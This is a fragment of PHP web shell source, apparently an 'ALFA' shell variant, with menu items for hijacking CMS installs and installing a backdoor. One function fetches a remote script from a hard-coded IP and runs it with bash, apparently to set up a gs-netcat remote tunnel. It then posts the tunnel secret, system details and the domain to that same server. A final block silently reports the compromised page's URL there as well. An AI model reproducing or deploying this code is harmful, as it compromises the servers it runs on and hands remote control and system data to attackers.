...
'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','gsc'=>'gsc','whois'=>'Whois','selfrm'=>'Remove Shell'
);
...
function alfagsc(){
    $cm = 'bash -c "$(curl -fsSL http://167.172.253.162/arc)" || bash -c "$(wget -qO- http://167.172.253.162/arc)"';
    $out = shell_exec($cm);
    $clear = trim($out);
    preg_match('/gs-netcat\s+-s[^\n]*/', $clear, $matches);
    if (!empty($matches)) {
        $apasi = $matches[0];
        $ser = shell_exec('uname -a');
        $ser = trim($ser);   
        $dom = " " . $_SERVER['HTTP_HOST']; 
        $yaapaa = "GSC: $apasi\n\nSystem Info:\nUname -a: $ser\nDomain : $dom";
        $dat = json_encode(['apasi' => $yaapaa]);
        $url = 'http://167.172.253.162/apt.php';
        $cm = 'curl -X POST -H "Content-Type: application/json" -d \'' . $dat . '\' ' . $url;
        shell_exec($cm);
    } else {
        echo "No Data 'gs-netcat -s'.";
    }
}
...
$alfacurrentUrl = "http://$alfahost$alfapath";
$alfaurl = "http://167.172.253.162/ask.php?a=" . urlencode($alfacurrentUrl);
$alfach = curl_init();
curl_setopt($alfach, CURLOPT_URL, $alfaurl); 
curl_setopt($alfach, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($alfach, CURLOPT_TIMEOUT, 30);
curl_exec($alfach);
curl_close($alfach);
?>
<script>
